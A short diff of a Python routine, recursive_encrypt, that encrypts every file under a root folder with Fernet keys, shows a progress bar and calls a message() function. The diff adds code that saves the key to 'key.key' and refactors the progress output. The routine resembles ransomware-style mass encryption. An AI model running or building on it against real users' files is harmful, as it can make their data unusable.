@@ -72,6 +72,8 @@ def recursive_encrypt(root):
         keys.append(Fernet.generate_key())
     
     key = b''.join(keys)
+    with open('key.key', 'wb') as f:
+        f.write(key)
     print("Done") 
 
     for dir_id in range(len(all_files)):
@@ -90,7 +92,9 @@ def recursive_encrypt(root):
                 
         total_advancment = int((100 * (dir_id + 1)) / len(all_files))
         current_folder = all_files[dir_id][0].split("/")[-1]
-        print(f"[{dir_id + 1}/{len(all_files)}]" + "[" + "#" * total_advancment + " " * (100 - total_advancment) + "]", f"{total_advancment}%", f"Encrypting {current_folder}...", end="\r")
+
+        loadbar = f"[{dir_id + 1}/{len(all_files)}]" + "[" + "#" * total_advancment + " " * (100 - total_advancment) + "]", f"{total_advancment}%", f"Encrypting {current_folder}..."
+        print(loadbar, end="\r")
     print("")
     message()    
 
